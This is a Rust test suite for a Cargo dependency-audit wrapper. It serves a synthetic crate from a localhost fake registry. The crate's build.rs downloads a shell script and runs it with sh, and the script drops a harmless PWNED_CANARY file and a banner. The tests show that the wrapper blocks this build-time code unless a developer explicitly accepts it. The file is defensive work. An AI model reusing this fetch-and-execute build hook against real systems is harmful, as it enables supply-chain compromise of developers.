//! End-to-end security POCs built from synthetic crates and a localhost registry.
//! They prove both default rejection and explicitly accepted build-code execution.

use cargo_wrapper_dependency_audit::Result;
use cargo_wrapper_dependency_audit::approvals::ApprovalStore;
use cargo_wrapper_dependency_audit::candidate::resolve_candidate;
use cargo_wrapper_dependency_audit::cargo_runner::DirectCargoRunner;
use cargo_wrapper_dependency_audit::command_policy::classify;
use cargo_wrapper_dependency_audit::findings::{ArtifactId, ArtifactReview};
use cargo_wrapper_dependency_audit::lockfile::CargoLock;
use cargo_wrapper_dependency_audit::prompt::{Decision, DecisionProvider};
use cargo_wrapper_dependency_audit::registry::{HttpRegistryClient, RegistryClient};
use cargo_wrapper_dependency_audit::security::SecurityGate;
use flate2::Compression;
use flate2::write::GzEncoder;
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::thread;
use std::time::Duration;

const PACKAGE: &str = "cargo-wrapper-poc-dependency";
const VERSION: &str = "1.0.1";
const ASCII_BANNER: &str = r#"
+==========================================================+
|              YOU COULD HAVE BEEN INFECTED!               |
|                                                          |
|       Relax: this is the localhost-only test POC.        |
+==========================================================+
"#;

fn plugin_command() -> Command {
    let cargo = std::env::var_os("CARGO").expect("Cargo test runner must expose CARGO");
    plugin_command_with_next(Path::new(&cargo))
}

fn plugin_command_with_next(next: &Path) -> Command {
    let cargo = std::env::var_os("CARGO").expect("Cargo test runner must expose CARGO");
    let mut command = Command::new(env!("CARGO_BIN_EXE_cargo-wrapper-plugin-dependency-audit"));
    command
        .env("CARGO_WRAPPER_PLUGIN_PROTOCOL", "1")
        .env("CARGO_WRAPPER_PLUGIN_NAME", "dependency-audit")
        .env("CARGO_WRAPPER_REAL_CARGO", &cargo)
        .env("CARGO_WRAPPER_NEXT", next);
    command
}

fn compile_forwarding_next(directory: &Path) -> std::path::PathBuf {
    let source = directory.join("later_plugin.rs");
    let executable = directory.join(format!("later-plugin{}", std::env::consts::EXE_SUFFIX));
    fs::write(
        &source,
        r#"
use std::env;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::process::{Command, exit};

fn main() {
    let args: Vec<String> = env::args().skip(1).collect();
    let trace = env::var_os("DEPENDENCY_AUDIT_NEXT_TRACE").unwrap();
    writeln!(
        OpenOptions::new().create(true).append(true).open(trace).unwrap(),
        "{args:?}"
    ).unwrap();
    let status = Command::new(env::var_os("DEPENDENCY_AUDIT_TEST_REAL_CARGO").unwrap())
        .args(&args)
        .status()
        .unwrap();
    if status.success() && env::var_os("DEPENDENCY_AUDIT_DIVERGE_LOCK").is_some() {
        let lock = fs::read_to_string("Cargo.lock").unwrap();
        let checksum = lock.find("checksum = \"").unwrap() + "checksum = \"".len();
        let end = checksum + lock[checksum..].find('"').unwrap();
        let mut changed = lock;
        changed.replace_range(checksum..end, &"0".repeat(64));
        fs::write("Cargo.lock", changed).unwrap();
    }
    exit(status.code().unwrap_or(1));
}
"#,
    )
    .unwrap();
    let output = Command::new(std::env::var_os("RUSTC").unwrap_or_else(|| "rustc".into()))
        .arg(&source)
        .arg("-o")
        .arg(&executable)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "later-plugin fixture failed to compile: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    executable
}

struct FakeSparseRegistry {
    address: SocketAddr,
    index_requests: Arc<AtomicUsize>,
    archive_requests: Arc<AtomicUsize>,
    payload_requests: Arc<AtomicUsize>,
    stop: Arc<AtomicBool>,
    thread: Option<thread::JoinHandle<()>>,
    checksum: String,
}

impl FakeSparseRegistry {
    fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let archive = synthetic_crate(address);
        let checksum = format!("{:x}", Sha256::digest(&archive));
        let index_requests = Arc::new(AtomicUsize::new(0));
        let archive_requests = Arc::new(AtomicUsize::new(0));
        let payload_requests = Arc::new(AtomicUsize::new(0));
        let stop = Arc::new(AtomicBool::new(false));
        let thread_index = Arc::clone(&index_requests);
        let thread_archive = Arc::clone(&archive_requests);
        let thread_payload = Arc::clone(&payload_requests);
        let thread_stop = Arc::clone(&stop);
        let thread_checksum = checksum.clone();
        let thread = thread::spawn(move || {
            while !thread_stop.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, _)) => serve(
                        stream,
                        address,
                        &archive,
                        &thread_checksum,
                        &thread_index,
                        &thread_archive,
                        &thread_payload,
                    ),
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });
        Self {
            address,
            index_requests,
            archive_requests,
            payload_requests,
            stop,
            thread: Some(thread),
            checksum,
        }
    }

    fn sparse_url(&self) -> String {
        format!("sparse+http://{}/", self.address)
    }
}

impl Drop for FakeSparseRegistry {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::SeqCst);
        let _ = TcpStream::connect(self.address);
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
    }
}

fn serve(
    mut stream: TcpStream,
    address: SocketAddr,
    archive: &[u8],
    checksum: &str,
    index_requests: &AtomicUsize,
    archive_requests: &AtomicUsize,
    payload_requests: &AtomicUsize,
) {
    let mut request = [0u8; 8192];
    let size = stream.read(&mut request).unwrap_or(0);
    let request = String::from_utf8_lossy(&request[..size]);
    let path = request
        .lines()
        .next()
        .and_then(|line| line.split_whitespace().nth(1))
        .unwrap_or("/");
    let (status, content_type, body) = if path == "/config.json" {
        (
            "200 OK",
            "application/json",
            format!(
                r#"{{"dl":"http://{address}/api/v1/crates/{{crate}}/{{version}}/download","api":null,"auth-required":false}}"#
            )
            .into_bytes(),
        )
    } else if path == "/ca/rg/cargo-wrapper-poc-dependency" {
        index_requests.fetch_add(1, Ordering::SeqCst);
        (
            "200 OK",
            "application/json",
            (format!(
                r#"{{"name":"{PACKAGE}","vers":"{VERSION}","deps":[],"cksum":"{checksum}","features":{{}},"yanked":false,"links":null}}"#
            ) + "\n")
                .into_bytes(),
        )
    } else if path == format!("/api/v1/crates/{PACKAGE}/{VERSION}/download") {
        archive_requests.fetch_add(1, Ordering::SeqCst);
        ("200 OK", "application/octet-stream", archive.to_vec())
    } else if path == "/poc-payload.sh" {
        payload_requests.fetch_add(1, Ordering::SeqCst);
        (
            "200 OK",
            "text/plain",
            format!(
                "#!/bin/sh\nprintf PWNED_CANARY > \"$POC_MARKER\"\ncat > \"$POC_BANNER\" <<'CARGO_WRAPPER_BANNER'\n{ASCII_BANNER}CARGO_WRAPPER_BANNER\ncat \"$POC_BANNER\" >&2\n"
            )
            .into_bytes(),
        )
    } else {
        ("404 Not Found", "text/plain", b"not found".to_vec())
    };
    let headers = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nETag: \"test\"\r\nConnection: close\r\n\r\n",
        body.len()
    );
    let _ = stream.write_all(headers.as_bytes());
    let _ = stream.write_all(&body);
}

fn synthetic_crate(address: SocketAddr) -> Vec<u8> {
    let manifest = format!(
        "[package]\nname='{PACKAGE}'\nversion='{VERSION}'\nedition='2024'\nbuild='build.rs'\n[lib]\npath='src/lib.rs'\n"
    );
    let build_script = r##"
#[cfg(unix)]
fn main() {
    use std::io::{Read, Write};

    let marker = std::env::var("POC_MARKER").expect("test marker path");
    let mut connection = std::net::TcpStream::connect("__LOOPBACK_ADDRESS__").unwrap();
    connection
        .write_all(b"GET /poc-payload.sh HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut response = Vec::new();
    connection.read_to_end(&mut response).unwrap();
    let body_start = response.windows(4).position(|window| window == b"\r\n\r\n").unwrap() + 4;
    let payload = std::path::PathBuf::from(&marker).with_file_name("poc-payload.sh");
    std::fs::write(&payload, &response[body_start..]).unwrap();
    let status = std::process::Command::new("sh")
        .arg(&payload)
        .env("POC_MARKER", &marker)
        .status()
        .unwrap();
    assert!(status.success());
}

#[cfg(not(unix))]
fn main() {
    let marker = std::env::var("POC_MARKER").expect("test marker path");
    let banner = std::env::var("POC_BANNER").expect("test banner path");
    std::fs::write(marker, b"PWNED_CANARY").unwrap();
    std::fs::write(banner, r#"__ASCII_BANNER__"#).unwrap();
}
"##;
    let build_script = build_script
        .replace("__LOOPBACK_ADDRESS__", &address.to_string())
        .replace("__ASCII_BANNER__", ASCII_BANNER);
    let mut archive = Vec::new();
    {
        let encoder = GzEncoder::new(&mut archive, Compression::default());
        let mut tar = tar::Builder::new(encoder);
        append(
            &mut tar,
            &format!("{PACKAGE}-{VERSION}/Cargo.toml"),
            manifest.as_bytes(),
        );
        append(
            &mut tar,
            &format!("{PACKAGE}-{VERSION}/build.rs"),
            build_script.as_bytes(),
        );
        append(
            &mut tar,
            &format!("{PACKAGE}-{VERSION}/src/lib.rs"),
            b"pub fn harmless_library() {}\n",
        );
        tar.into_inner().unwrap().finish().unwrap();
    }
    archive
}

fn append<W: Write>(tar: &mut tar::Builder<W>, path: &str, bytes: &[u8]) {
    let mut header = tar::Header::new_gnu();
    header.set_size(bytes.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append_data(&mut header, path, bytes).unwrap();
}

fn create_workspace(path: &Path, registry: &FakeSparseRegistry) {
    fs::create_dir_all(path.join("src")).unwrap();
    fs::create_dir_all(path.join(".cargo")).unwrap();
    fs::write(path.join("src/main.rs"), "fn main() {}\n").unwrap();
    fs::write(
        path.join("Cargo.toml"),
        format!(
            "[package]\nname='poc-workspace'\nversion='0.1.0'\nedition='2024'\n[dependencies]\n{PACKAGE}={{version='={VERSION}',registry='poc'}}\n"
        ),
    )
    .unwrap();
    fs::write(
        path.join(".cargo/config.toml"),
        format!("[registries.poc]\nindex='{}'\n", registry.sparse_url()),
    )
    .unwrap();
}

struct RejectFindings;

impl DecisionProvider for RejectFindings {
    fn authorize_inspection(&mut self, _: &[ArtifactId]) -> Result<bool> {
        Ok(true)
    }

    fn decide(&mut self, review: &ArtifactReview) -> Result<Decision> {
        println!("\n============================================================");
        println!("CARGO-WRAPPER SECURITY FINDING — SYNTHETIC POC");
        println!("============================================================");
        println!(
            "crate:   {} {}",
            review.artifact.name, review.artifact.version
        );
        println!("Detected before wrapper-controlled Cargo execution:");
        for finding in &review.findings {
            println!("  - {}: {}", finding.capability, finding.detail);
        }
        println!("Decision provider: REJECT\n");
        Ok(Decision::Reject)
    }
}

struct AcceptRiskOnce;

impl DecisionProvider for AcceptRiskOnce {
    fn authorize_inspection(&mut self, artifacts: &[ArtifactId]) -> Result<bool> {
        println!(
            "Inspection authorization: I ({} synthetic artifact{})",
            artifacts.len(),
            if artifacts.len() == 1 { "" } else { "s" }
        );
        Ok(true)
    }

    fn decide(&mut self, review: &ArtifactReview) -> Result<Decision> {
        println!("\nCARGO-WRAPPER SECURITY FINDING — ACCEPTANCE POC");
        println!(
            "crate: {} {}",
            review.artifact.name, review.artifact.version
        );
        for finding in &review.findings {
            println!("  - {}: {}", finding.capability, finding.detail);
        }
        println!("[2/O] Accept once selected by synthetic developer");
        Ok(Decision::AcceptOnce)
    }
}

#[test]
fn candidate_resolution_is_index_only() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    create_workspace(workspace.path(), &registry);
    let args: Vec<String> = ["forcegenerate-lockfile"]
        .into_iter()
        .map(str::to_owned)
        .collect();
    let invocation = classify(&args).unwrap();
    let runner = DirectCargoRunner::new(std::env::var_os("CARGO").unwrap().into());
    let candidate = resolve_candidate(
        &runner,
        workspace.path(),
        workspace.path(),
        &args,
        &invocation,
    )
    .unwrap();
    assert!(candidate.lockfile.is_file());
    assert!(registry.index_requests.load(Ordering::SeqCst) > 0);
    assert_eq!(registry.archive_requests.load(Ordering::SeqCst), 0);
    assert!(!candidate.cargo_home.join("registry/cache").exists());
    assert!(!candidate.cargo_home.join("registry/src").exists());
}

#[test]
fn batch_audit_dump_and_acceptance_modes_preserve_the_security_boundary() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    let fixture = tempfile::tempdir().unwrap();
    let next = compile_forwarding_next(fixture.path());
    let trace = fixture.path().join("next-trace");
    let real_cargo = std::env::var_os("CARGO").unwrap();
    create_workspace(workspace.path(), &registry);
    let approval_file = workspace.path().join("approvals.toml");
    let dumped = plugin_command_with_next(&next)
        .args(["forcegenerate-lockfile", "--dump-audit-prompt"])
        .current_dir(workspace.path())
        .env("DEPENDENCY_AUDIT_NEXT_TRACE", &trace)
        .env("DEPENDENCY_AUDIT_TEST_REAL_CARGO", &real_cargo)
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .output()
        .unwrap();
    assert!(dumped.status.success());
    assert!(!workspace.path().join("Cargo.lock").exists());
    assert!(!approval_file.exists());
    assert!(!trace.exists(), "dump mode must not call the next plugin");
    assert_eq!(registry.payload_requests.load(Ordering::SeqCst), 0);
    assert!(registry.archive_requests.load(Ordering::SeqCst) > 0);
    let output = String::from_utf8(dumped.stdout).unwrap();
    assert!(output.contains("Tell your LLM or coding agent"));
    assert!(output.contains("The requested Cargo operation was not run"));
    let reports: Vec<_> = fs::read_dir(workspace.path())
        .unwrap()
        .filter_map(|entry| {
            let path = entry.ok()?.path();
            path.file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| name.starts_with("audit-prompt-") && name.ends_with(".md"))
                .then_some(path)
        })
        .collect();
    assert_eq!(reports.len(), 1);
    let report = fs::read_to_string(&reports[0]).unwrap();
    assert!(report.contains("Overall verdict: ACCEPT_ALL"));
    assert!(report.contains("DO NOT execute, build, install, test, clone, or import"));
    assert!(report.contains(PACKAGE));
    assert!(report.contains(&registry.checksum));
    assert!(report.contains("BEGIN UNTRUSTED WRAPPER FINDINGS"));

    let accepted_once = plugin_command_with_next(&next)
        .args(["forcegenerate-lockfile", "--accept-all-once"])
        .current_dir(workspace.path())
        .env("DEPENDENCY_AUDIT_NEXT_TRACE", &trace)
        .env("DEPENDENCY_AUDIT_TEST_REAL_CARGO", &real_cargo)
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .output()
        .unwrap();
    assert!(accepted_once.status.success());
    let lock = CargoLock::parse(&workspace.path().join("Cargo.lock")).unwrap();
    let artifact = lock.remote_artifacts().unwrap().remove(0);
    let store = ApprovalStore::load(approval_file.clone()).unwrap();
    assert!(!store.has_artifact(&artifact));
    assert!(
        !approval_file.exists(),
        "accept-all-once must not persist clean artifacts or workspace state"
    );
    assert_eq!(fs::read_to_string(&trace).unwrap().lines().count(), 1);
    assert!(
        String::from_utf8(accepted_once.stderr)
            .unwrap()
            .contains("explicitly accepting all findings")
    );

    fs::remove_file(workspace.path().join("Cargo.lock")).unwrap();
    fs::remove_file(&trace).unwrap();
    let remembered = plugin_command_with_next(&next)
        .args(["forcegenerate-lockfile", "--accept-and-remember-all"])
        .current_dir(workspace.path())
        .env("DEPENDENCY_AUDIT_NEXT_TRACE", &trace)
        .env("DEPENDENCY_AUDIT_TEST_REAL_CARGO", &real_cargo)
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .output()
        .unwrap();
    assert!(remembered.status.success());
    let lock = CargoLock::parse(&workspace.path().join("Cargo.lock")).unwrap();
    let artifact = lock.remote_artifacts().unwrap().remove(0);
    let store = ApprovalStore::load(approval_file).unwrap();
    assert!(store.has_artifact(&artifact));
    assert_eq!(fs::read_to_string(&trace).unwrap().lines().count(), 1);
    assert!(
        String::from_utf8(remembered.stderr)
            .unwrap()
            .contains("accepting and remembering all findings")
    );
    assert_eq!(registry.payload_requests.load(Ordering::SeqCst), 0);
}

#[test]
fn interactive_rejection_never_calls_the_later_plugin() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    let fixture = tempfile::tempdir().unwrap();
    let next = compile_forwarding_next(fixture.path());
    let trace = fixture.path().join("next-trace");
    let approval_file = fixture.path().join("approvals.toml");
    create_workspace(workspace.path(), &registry);

    let mut child = plugin_command_with_next(&next)
        .arg("forcegenerate-lockfile")
        .current_dir(workspace.path())
        .env("DEPENDENCY_AUDIT_NEXT_TRACE", &trace)
        .env(
            "DEPENDENCY_AUDIT_TEST_REAL_CARGO",
            std::env::var_os("CARGO").unwrap(),
        )
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(b"i\nR\n").unwrap();
    let output = child.wait_with_output().unwrap();

    assert!(!output.status.success());
    assert!(!trace.exists(), "rejection must not call the next plugin");
    assert!(!workspace.path().join("Cargo.lock").exists());
    assert!(!approval_file.exists());
    assert_eq!(registry.payload_requests.load(Ordering::SeqCst), 0);
}

#[test]
fn divergent_downstream_lock_is_rejected_and_rolled_back() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    let fixture = tempfile::tempdir().unwrap();
    let next = compile_forwarding_next(fixture.path());
    let trace = fixture.path().join("next-trace");
    let approval_file = fixture.path().join("approvals.toml");
    create_workspace(workspace.path(), &registry);

    let output = plugin_command_with_next(&next)
        .args(["forcegenerate-lockfile", "--accept-all-once"])
        .current_dir(workspace.path())
        .env("DEPENDENCY_AUDIT_NEXT_TRACE", &trace)
        .env(
            "DEPENDENCY_AUDIT_TEST_REAL_CARGO",
            std::env::var_os("CARGO").unwrap(),
        )
        .env("DEPENDENCY_AUDIT_DIVERGE_LOCK", "1")
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .output()
        .unwrap();

    assert!(!output.status.success());
    assert!(
        String::from_utf8_lossy(&output.stderr).contains("differs from the reviewed candidate")
    );
    assert_eq!(fs::read_to_string(&trace).unwrap().lines().count(), 1);
    assert!(!workspace.path().join("Cargo.lock").exists());
    assert!(!approval_file.exists());
}

#[test]
fn real_cargo_executes_poc_but_security_gate_rejects_before_exposure() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    create_workspace(workspace.path(), &registry);
    let cargo_home = tempfile::tempdir().unwrap();
    let marker = workspace.path().join("PWNED_CANARY");
    let banner = workspace.path().join("POC_BANNER");
    let status = Command::new(std::env::var_os("CARGO").unwrap())
        .arg("build")
        .current_dir(workspace.path())
        .env("CARGO_HOME", cargo_home.path())
        .env("POC_MARKER", &marker)
        .env("POC_BANNER", &banner)
        .status()
        .unwrap();
    assert!(status.success());
    assert_eq!(fs::read(&marker).unwrap(), b"PWNED_CANARY");
    assert_eq!(fs::read_to_string(&banner).unwrap(), ASCII_BANNER);
    println!("\n[UNWRAPPED CARGO]");
    println!("CARGO-WRAPPER SECURITY POC: UNTRUSTED BUILD-TIME CODE EXECUTED");
    println!("PWNED_CANARY created in the isolated test directory: yes");
    #[cfg(unix)]
    {
        assert!(registry.payload_requests.load(Ordering::SeqCst) > 0);
        println!("Attack chain: localhost download -> temp script -> sh execution");
    }

    fs::remove_file(&marker).unwrap();
    fs::remove_file(&banner).unwrap();
    println!("\n[WRAPPER SECURITY GATE]");
    println!("Inspecting the exact same synthetic crate as inert in-memory data...");
    let source = registry.sparse_url();
    let lock: CargoLock = toml::from_str(&format!(
        "version=4\n[[package]]\nname='{PACKAGE}'\nversion='{VERSION}'\nsource='{source}'\nchecksum='{}'",
        registry.checksum
    ))
    .unwrap();
    let approvals = tempfile::tempdir().unwrap();
    let mut store = ApprovalStore::load(approvals.path().join("approvals.toml")).unwrap();
    let client = HttpRegistryClient::default();
    let mut decisions = RejectFindings;
    let mut gate = SecurityGate {
        store: &mut store,
        registry: &client as &dyn RegistryClient,
        decisions: &mut decisions,
    };
    let result = gate.review_lock(&lock, "changed-lock".into());
    assert!(
        result
            .unwrap_err()
            .to_string()
            .contains("security review rejected")
    );
    assert!(!marker.exists());
    assert!(!banner.exists());
    println!("PWNED_CANARY created after wrapper rejection: no");
}

#[test]
fn accepting_bad_build_time_code_allows_it_to_execute() {
    let registry = FakeSparseRegistry::start();
    let workspace = tempfile::tempdir().unwrap();
    create_workspace(workspace.path(), &registry);
    let cargo_home = tempfile::tempdir().unwrap();
    let marker = workspace.path().join("PWNED_CANARY");
    let banner = workspace.path().join("POC_BANNER");

    let resolved = Command::new(std::env::var_os("CARGO").unwrap())
        .arg("generate-lockfile")
        .current_dir(workspace.path())
        .env("CARGO_HOME", cargo_home.path())
        .status()
        .unwrap();
    assert!(resolved.success());
    assert_eq!(registry.archive_requests.load(Ordering::SeqCst), 0);
    assert!(!marker.exists());
    assert!(!banner.exists());

    let lock = CargoLock::parse(&workspace.path().join("Cargo.lock")).unwrap();
    let artifact = lock.remote_artifacts().unwrap().remove(0);
    let approvals = tempfile::tempdir().unwrap();
    let mut store = ApprovalStore::load(approvals.path().join("approvals.toml")).unwrap();
    let client = HttpRegistryClient::default();
    let mut decisions = AcceptRiskOnce;
    let mut gate = SecurityGate {
        store: &mut store,
        registry: &client as &dyn RegistryClient,
        decisions: &mut decisions,
    };

    let reviewed = gate.review_lock(&lock, "accepted-risk".into()).unwrap();
    assert!(!reviewed.fully_remembered, "Accept once must not persist");
    assert!(
        !store.has_artifact(&artifact),
        "Accept once must not create an artifact approval"
    );
    assert!(
        !marker.exists(),
        "static inspection must not execute source"
    );
    assert!(
        !banner.exists(),
        "static inspection must not execute source"
    );

    println!("\nRisk accepted. Handing the reviewed lock to real Cargo...");
    let built = Command::new(std::env::var_os("CARGO").unwrap())
        .args(["build", "--locked"])
        .current_dir(workspace.path())
        .env("CARGO_HOME", cargo_home.path())
        .env("POC_MARKER", &marker)
        .env("POC_BANNER", &banner)
        .status()
        .unwrap();
    assert!(built.success());

    assert_eq!(fs::read(&marker).unwrap(), b"PWNED_CANARY");
    let displayed_banner = fs::read_to_string(&banner).unwrap();
    assert_eq!(displayed_banner, ASCII_BANNER);
    #[cfg(unix)]
    assert!(registry.payload_requests.load(Ordering::SeqCst) > 0);
    println!("{displayed_banner}");
    println!("Assertion: accepted bad build-time code executed and created PWNED_CANARY.");
}

#[test]
fn forcegenerate_transaction_creates_reviewed_lock_and_enables_fast_build() {
    let workspace = tempfile::tempdir().unwrap();
    fs::create_dir(workspace.path().join("src")).unwrap();
    fs::write(
        workspace.path().join("Cargo.toml"),
        "[package]\nname='local-only'\nversion='0.1.0'\nedition='2024'\n",
    )
    .unwrap();
    fs::write(workspace.path().join("src/main.rs"), "fn main() {}\n").unwrap();
    let approvals = tempfile::tempdir().unwrap();
    let approval_file = approvals.path().join("approvals.toml");
    let generated = plugin_command()
        .arg("forcegenerate-lockfile")
        .current_dir(workspace.path())
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .status()
        .unwrap();
    assert!(generated.success());
    assert!(workspace.path().join("Cargo.lock").is_file());
    assert!(approval_file.is_file());

    let built = plugin_command()
        .arg("build")
        .current_dir(workspace.path())
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            &approval_file,
        )
        .status()
        .unwrap();
    assert!(built.success());
}

#[test]
fn ordinary_remove_uses_the_reviewed_transaction_without_force() {
    let workspace = tempfile::tempdir().unwrap();
    fs::create_dir(workspace.path().join("src")).unwrap();
    fs::create_dir_all(workspace.path().join("local-dependency/src")).unwrap();
    fs::write(
        workspace.path().join("Cargo.toml"),
        "[package]\nname='remove-poc'\nversion='0.1.0'\nedition='2024'\n[dependencies]\nlocal-dependency={path='local-dependency'}\n",
    )
    .unwrap();
    fs::write(workspace.path().join("src/main.rs"), "fn main() {}\n").unwrap();
    fs::write(
        workspace.path().join("local-dependency/Cargo.toml"),
        "[package]\nname='local-dependency'\nversion='0.1.0'\nedition='2024'\n[lib]\npath='src/lib.rs'\n",
    )
    .unwrap();
    fs::write(
        workspace.path().join("local-dependency/src/lib.rs"),
        "pub fn local_only() {}\n",
    )
    .unwrap();

    let generated = Command::new(std::env::var_os("CARGO").unwrap())
        .arg("generate-lockfile")
        .current_dir(workspace.path())
        .status()
        .unwrap();
    assert!(generated.success());

    let approvals = tempfile::tempdir().unwrap();
    let removed = plugin_command()
        .args(["remove", "local-dependency"])
        .current_dir(workspace.path())
        .env(
            "CARGO_WRAPPER_DEPENDENCY_AUDIT_APPROVAL_FILE",
            approvals.path().join("approvals.toml"),
        )
        .status()
        .unwrap();
    assert!(removed.success());

    let manifest = fs::read_to_string(workspace.path().join("Cargo.toml")).unwrap();
    assert!(!manifest.contains("local-dependency={"));
    let lock = CargoLock::parse(&workspace.path().join("Cargo.lock")).unwrap();
    assert!(lock.remote_artifacts().unwrap().is_empty());
}
